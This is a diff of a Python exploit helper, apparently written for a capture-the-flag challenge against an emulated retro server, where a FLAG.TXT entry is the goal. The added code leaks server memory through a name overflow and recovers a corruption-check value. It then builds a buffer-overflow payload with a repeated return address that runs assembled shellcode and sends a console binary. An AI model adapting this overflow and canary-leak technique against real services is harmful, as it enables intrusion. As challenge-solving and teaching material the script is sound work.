@@ -1,10 +1,12 @@
-# pylint: disable=global-statement,invalid-name,unused-import
+# pylint: disable=global-statement,invalid-name
 import socket
 import select
 import builtins
 import re
 import string
-from assemble import assemble_inline
+from assemble import assemble_inline, assemble_file
+
+_export = (assemble_inline, assemble_file)
 
 con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -195,7 +197,9 @@ BLK  SIZE  NAME
 =======================
 07   01F9  TODO.TXT
 08   0560  REPORT03.PRG
-0A   02B1  MATHTEST.PRG"""
+0A   02B1  MATHTEST.PRG
+01   0035  FLAG.TXT
+"""
 
 
 def filesize(filename):
@@ -250,19 +254,25 @@ def bytes_(x):
         return bytes(x)
 
 
-def overflow_server3(data, base=b"abcdefghijklmno"):
-    connect_server3()
-    out = ""
+def send_serv3(msg, timeout=3):
     try:
-        out += send(bytes_(base) + bytes_(data) + b"\n", expected_end=" to leave: ", timeout=10)
-        out += send("q\n", timeout=10, expected_end=" to leave: ")
+        return send(msg, expected_end=" to leave: ", timeout=timeout)
     except ConnectionClosedException as e:
         if len(e.args) >= 2 and e.args[0] == "EOF":
-            out += e.args[1]
+            return e.args[1]
+    return ""
+
+
+def connect_serv3_with_name(name, cmd="q"):
+    connect_server3()
+    out = ""
+    out += send_serv3(bytes_(name) + b"\n")
+    if cmd:
+        out += send_serv3(cmd + "\n")
     return out
 
 
-def read_serv3_mem(base_addr):
+def read_serv3_mem(base_addr, cmd="q"):
     name = []
     for i in range(4):
         name.append(0xF0)
@@ -270,7 +280,7 @@ def read_serv3_mem(base_addr):
         name.append(addr % 256)
         name.append(addr >> 8)
 
-    resp = overflow_server3("", base=name)
+    resp = connect_serv3_with_name(name, cmd)
 
     resp_name = re.findall(r"Welcome, (.{16})", resp)[0]
 
@@ -282,3 +292,48 @@ def read_serv3_mem(base_addr):
         out.append(mem >> 8)
 
     return out
+
+
+def connect_serv3_with_corruption_check():
+    return bytes(read_serv3_mem(0xFE00, cmd="1")[:4])
+
+
+mem_rand_backup = 0xfe00
+mem_input_buf = 0xf753
+stack = 0xff00
+
+
+def connect_serv3_corrupt(payload, payload_addr=mem_input_buf, expected_end="E"):
+    assert isinstance(payload, bytes)
+    assert payload_addr >= mem_input_buf
+    if b'\n' in payload:
+        raise Exception("No newlines pls")
+
+    out = b""
+    out += b"A"*(payload_addr-mem_input_buf)
+    out += payload
+    addr = mem_input_buf + len(out)
+    assert addr <= mem_rand_backup, "Payload too big"
+
+    out += b"B" * (mem_rand_backup-addr)
+    corrupt_check = b"\n"
+    while b"\n" in corrupt_check:
+        corrupt_check = connect_serv3_with_corruption_check()
+    out += corrupt_check
+
+    addr = mem_input_buf + len(out)
+    out += b"C" * (stack-0x10-addr)
+    addr_bytes = bytes([payload_addr % 256, payload_addr//256])
+    out += addr_bytes * 0x14
+    out += b"DDDD\n"
+
+    return send(out, timeout=10, expected_end=expected_end)
+
+
+def connect_serv3_with_console():
+    payload_addr = 0xfc00
+    payload = bytes(assemble_file("payload.prg", payload_addr))
+    console = bytes(open("console.bin", "rb").read())
+
+    connect_serv3_corrupt(payload, payload_addr)
+    send(console + b"\n")
